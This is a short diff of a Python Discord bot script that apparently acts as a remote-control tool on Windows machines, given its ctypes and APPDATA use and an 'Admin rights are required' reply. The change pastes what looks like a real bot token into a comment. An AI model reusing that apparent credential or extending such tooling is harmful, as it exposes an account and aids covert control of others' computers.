@@ -13,7 +13,7 @@ from discord.ext import commands
 from ctypes import *
 import asyncio
 from discord import utils
-token = '' #Enter your token here
+token = '' #MTQwNDA3OTQxMTgzNzI3MjE1Nw.G_ge8R.HQDotPGXhFpAzOPLxYwGPQWVhzwhy7OmVHYR1A
 global appdata
 appdata = os.getenv('APPDATA')
 client = discord.Client()
@@ -560,3 +560,4 @@ async def on_message(message):
                 await message.channel.send("[!] Admin rights are required for this operation")
 
 client.run(token)
+
